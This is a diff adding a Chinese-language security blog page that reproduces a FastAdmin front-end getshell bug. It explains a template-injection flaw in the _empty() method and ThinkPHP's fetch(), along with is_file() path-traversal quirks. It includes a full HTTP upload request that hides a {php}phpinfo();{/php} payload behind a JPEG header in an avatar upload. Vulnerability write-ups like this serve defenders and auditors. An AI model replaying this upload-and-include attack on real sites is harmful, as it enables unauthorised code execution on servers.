@@ -1,0 +1,304 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="FastAdmin 会员中心前台getshell一、漏洞简介利用条件&#x2F;application&#x2F;config.php 文件中： &#x2F;&#x2F;是否开启前台会员中心 &#39;usercenter&#39;            &#x3D;&gt; true,  即需要开启会员中心功能 二、漏洞影响V1.0.0.20200506_beta 三、复现过程漏洞分析">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/FastAdmin/FastAdmin%20%E4%BC%9A%E5%91%98%E4%B8%AD%E5%BF%83%E5%89%8D%E5%8F%B0getshell/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="FastAdmin 会员中心前台getshell一、漏洞简介利用条件&#x2F;application&#x2F;config.php 文件中： &#x2F;&#x2F;是否开启前台会员中心 &#39;usercenter&#39;            &#x3D;&gt; true,  即需要开启会员中心功能 二、漏洞影响V1.0.0.20200506_beta 三、复现过程漏洞分析">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/FastAdmin%E4%BC%9A%E5%91%98%E4%B8%AD%E5%BF%83%E5%89%8D%E5%8F%B0getshell/media/rId26.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/FastAdmin%E4%BC%9A%E5%91%98%E4%B8%AD%E5%BF%83%E5%89%8D%E5%8F%B0getshell/media/rId27.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/FastAdmin%E4%BC%9A%E5%91%98%E4%B8%AD%E5%BF%83%E5%89%8D%E5%8F%B0getshell/media/rId28.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/FastAdmin%E4%BC%9A%E5%91%98%E4%B8%AD%E5%BF%83%E5%89%8D%E5%8F%B0getshell/media/rId29.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/FastAdmin%E4%BC%9A%E5%91%98%E4%B8%AD%E5%BF%83%E5%89%8D%E5%8F%B0getshell/media/rId31.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/FastAdmin%E4%BC%9A%E5%91%98%E4%B8%AD%E5%BF%83%E5%89%8D%E5%8F%B0getshell/media/rId32.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/FastAdmin%E4%BC%9A%E5%91%98%E4%B8%AD%E5%BF%83%E5%89%8D%E5%8F%B0getshell/media/rId33.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/FastAdmin%E4%BC%9A%E5%91%98%E4%B8%AD%E5%BF%83%E5%89%8D%E5%8F%B0getshell/media/rId34.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/FastAdmin%E4%BC%9A%E5%91%98%E4%B8%AD%E5%BF%83%E5%89%8D%E5%8F%B0getshell/media/rId35.png">
+<meta property="article:published_time" content="2022-07-08T06:25:56.220Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.674Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/FastAdmin%E4%BC%9A%E5%91%98%E4%B8%AD%E5%BF%83%E5%89%8D%E5%8F%B0getshell/media/rId26.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-FastAdmin/FastAdmin 会员中心前台getshell" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/FastAdmin/FastAdmin%20%E4%BC%9A%E5%91%98%E4%B8%AD%E5%BF%83%E5%89%8D%E5%8F%B0getshell/" class="article-date">
+  <time datetime="2022-07-08T06:25:56.220Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="FastAdmin-会员中心前台getshell"><a href="#FastAdmin-会员中心前台getshell" class="headerlink" title="FastAdmin 会员中心前台getshell"></a>FastAdmin 会员中心前台getshell</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p><code>/application/config.php</code> 文件中：</p>
+<pre><code>//是否开启前台会员中心
+&#39;usercenter&#39;            =&gt; true,
+</code></pre>
+<p>即需要开启会员中心功能</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>V1.0.0.20200506_beta</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><code>/application/index/User.php</code>文件</p>
+<p>第58-67行：</p>
+<pre><code> public function _empty($name)
+    &#123;    
+        $data = Hook::listen(&quot;user_request_empty&quot;, $name);
+            foreach ($data as $index =&gt; $datum) &#123;
+            $this-&gt;view-&gt;assign($datum);
+            &#125;
+    return $this-&gt;view-&gt;fetch($name);
+&#125;
+user_request_empty`为开发者预留的钩子可以忽视不看，主要看` return $this-&gt;view-&gt;fetch($name);
+</code></pre>
+<p>此方法中的<code>$name</code>参数可控，并且将<code>$name</code>的值传入到了<code>fecth()</code>函数中。</p>
+<p><code>fetch()</code>为thinkphp的解析模板函数，其返回模板文件渲染后的内容</p>
+<p><code>fetch()</code>函数的关键内容如下：</p>
+<pre><code>  public function fetch($template, $data = [], $config = [])
+    &#123;
+        if (&#39;&#39; == pathinfo($template, PATHINFO_EXTENSION)) &#123;
+            // 获取模板文件名
+            $template = $this-&gt;parseTemplate($template);
+        &#125;
+        // 模板不存在 抛出异常
+        if (!is_file($template)) &#123;
+            throw new TemplateNotFoundException(&#39;template not exists:&#39; . $template, $template);
+        &#125;
+        // 记录视图信息
+        App::$debug &amp;&amp; Log::record(&#39;[ VIEW ] &#39; . $template . &#39; [ &#39; . var_export(array_keys($data), true) . &#39; ]&#39;, &#39;info&#39;);
+        $this-&gt;template-&gt;fetch($template, $data, $config);
+    &#125;
+</code></pre>
+<p>继续调用栈可以看下其实这个fetch()函数调用的是内置模板引擎的fetch方法，<br>这个方法实际上就是将要输出的页面内容赋值给一个变量，为了方便，thinkphp在对模板渲染的过程中，添加了php标签功能，使得其可以解析php代码。</p>
+<p>总之一句话，这个漏洞其实就是由于对传入变量过滤不严导致的模板引擎注入漏洞，只要控制了传入模板的文件，就可以利用模板本身的渲染功能，实现包含漏洞getshell</p>
+<p>另外需要注意的是，当验证传入的模板是否是文件时，使用的<code>is_file()</code>函数，这个函数在Linux下和windows下的判断会有所不同，具体如下：</p>
+<p>1、在linux下利用<code>is_file()</code>来判断类似于<code>/****/../../../../etc/passwd</code>文件时，如果<code>****</code>是不存在的目录，则会返回false，在windows下<br>，这个目录存在与否，均返回true，如下图所示：</p>
+<p><img src="/resource/FastAdmin%E4%BC%9A%E5%91%98%E4%B8%AD%E5%BF%83%E5%89%8D%E5%8F%B0getshell/media/rId26.png" alt="1.png"></p>
+<p><img src="/resource/FastAdmin%E4%BC%9A%E5%91%98%E4%B8%AD%E5%BF%83%E5%89%8D%E5%8F%B0getshell/media/rId27.png" alt="2.png"></p>
+<p>2、在linux下，<code>is_file()</code>函数判可用于判断符号链接</p>
+<p>3、在linux下，<code>is_file</code>函数会受到权限的影响，当前用户权限不足或父目录没有设置+x权限时，<code>is_file()</code>会返回false</p>
+<p>4、windows系统里面<code>/</code>和<code>\</code> 都可以使用，但是在linux下只能使用<code>/</code><br>来分隔路径，因此这会导致<code>is_file()</code>在不同系统下的返回结果不一致</p>
+<p><img src="/resource/FastAdmin%E4%BC%9A%E5%91%98%E4%B8%AD%E5%BF%83%E5%89%8D%E5%8F%B0getshell/media/rId28.png" alt="3.png"></p>
+<p><img src="/resource/FastAdmin%E4%BC%9A%E5%91%98%E4%B8%AD%E5%BF%83%E5%89%8D%E5%8F%B0getshell/media/rId29.png" alt="4.png"></p>
+<p>5、<code>is_file()</code>判断文件时，如果文件大小超过2^32时，会判断失败</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>通过前文可知，这个漏洞的利用点在<code>_empty()</code>函数，需要注意的是，在官方文档中通常<code>_empty()</code>方法是用来判断一个方法是否存在，如果不存在，则进入该函数。而这里是开发者自定义的方法，因此直接传入<code>_empty</code>方法，调用name参数即可。</p>
+<p>利用过程如下：</p>
+<p>在前台的会员中心，个人资料处，上传修改头像：</p>
+<p><img src="/resource/FastAdmin%E4%BC%9A%E5%91%98%E4%B8%AD%E5%BF%83%E5%89%8D%E5%8F%B0getshell/media/rId31.png" alt="5.png"></p>
+<p>抓包后修改图片数据（满足图片头格式即可）：</p>
+<pre><code>POST /index/ajax/upload HTTP/1.1
+Host:www.0-sec.org:8088
+Content-Length: 596
+Origin: http://122.114.216.233
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryJ60Dcmopu4qDLQwq
+Accept: */*
+Referer: http://103.40.247.24/index/user/profile.html
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: Hm_lvt_f8d0a8c400404989e195270b0bbf060a=1600651554; PHPSESSID=e42uhkmhirv29cpd82qbubigd7; uid=3; token=251be91c-040b-4231-b955-76c3ecfaf4f4; Hm_lpvt_f8d0a8c400404989e195270b0bbf060a=1600651809
+Connection: close
+
+------WebKitFormBoundaryJ60Dcmopu4qDLQwq
+Content-Disposition: form-data; name=&quot;name&quot;
+
+400x400a0a0.jpg
+------WebKitFormBoundaryJ60Dcmopu4qDLQwq
+Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;400x400a0a0.jpg&quot;
+Content-Type: image/jpeg
+
+ÿØÿà8Photoshop 3.08BIM8BIM%&quot;
+&#123;php&#125;phpinfo();&#123;/php&#125;
+------WebKitFormBoundaryJ60Dcmopu4qDLQwq--
+</code></pre>
+<p><img src="/resource/FastAdmin%E4%BC%9A%E5%91%98%E4%B8%AD%E5%BF%83%E5%89%8D%E5%8F%B0getshell/media/rId32.png" alt="6.png"></p>
+<p>记录下路径后，成功getshell</p>
+<p><img src="/resource/FastAdmin%E4%BC%9A%E5%91%98%E4%B8%AD%E5%BF%83%E5%89%8D%E5%8F%B0getshell/media/rId33.png" alt="7.png"></p>
+<p>在Linux下，通过这种方法会失效，因为在<code>/public</code>路径下不存在<code>user</code>目录，由前文中的知识点可以知道，当不存在这个目录的时候，无论怎么跳转目录，<code>is_file()</code>函数返回的结果始终未false，因此无法利用该漏洞，如下图所示：</p>
+<p><img src="/resource/FastAdmin%E4%BC%9A%E5%91%98%E4%B8%AD%E5%BF%83%E5%89%8D%E5%8F%B0getshell/media/rId34.png" alt="8.png"></p>
+<p>当我们在<code>/public</code>目录下创建文件夹<code>/user</code>，在利用，即可成功：</p>
+<p><img src="/resource/FastAdmin%E4%BC%9A%E5%91%98%E4%B8%AD%E5%BF%83%E5%89%8D%E5%8F%B0getshell/media/rId35.png" alt="9.png"></p>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.cnpanda.net/codeaudit/777.html">https://www.cnpanda.net/codeaudit/777.html</a></p>
+</blockquote>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+        <a data-url="https://she11c0de.github.io/2022/07/07/FastAdmin/FastAdmin%20%E4%BC%9A%E5%91%98%E4%B8%AD%E5%BF%83%E5%89%8D%E5%8F%B0getshell/" data-id="cl5c2qow0006vy8v113knfgun" class="article-share-link">分享到</a>
+      
+
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2022/07/07/FastAdmin/FastAdmin%20%E5%90%8E%E5%8F%B0%20auth_rule%20%E6%9D%83%E9%99%90%E8%AE%A4%E8%AF%81getshell/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          (no title)
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2022/07/07/FastAdmin/FastAdmin%20csrf+%E5%AD%98%E5%82%A8%E5%9E%8Bxss%E6%BC%8F%E6%B4%9E/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 She11c0de<br>
+      Theme <a href="https://github.com/henryhuang/oishi" target="_blank">Oishi</a>, Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <!--
+      <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">首页</a>
+  
+    <a href="/categories/life" class="mobile-nav-link">生活</a>
+  
+    <a href="/archives" class="mobile-nav-link">归档</a>
+  
+</nav>
+    -->
+    
+
+<!-- 百度分享 start -->
+
+<!-- 百度分享 end -->
+
+<script src="//cdn.bootcss.com/jquery/1.11.1/jquery.min.js"></script>
+
+
+
+
+<script src="/js/jquery.scrollUp.min.js"></script>
+
+
+<script src="/js/jquery.transform.js"></script>
+
+
+<script src="/js/menu.js"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+<script src="/js/scrollUp.js"></script>
+
+
+  </div>
+</body>
+</html>
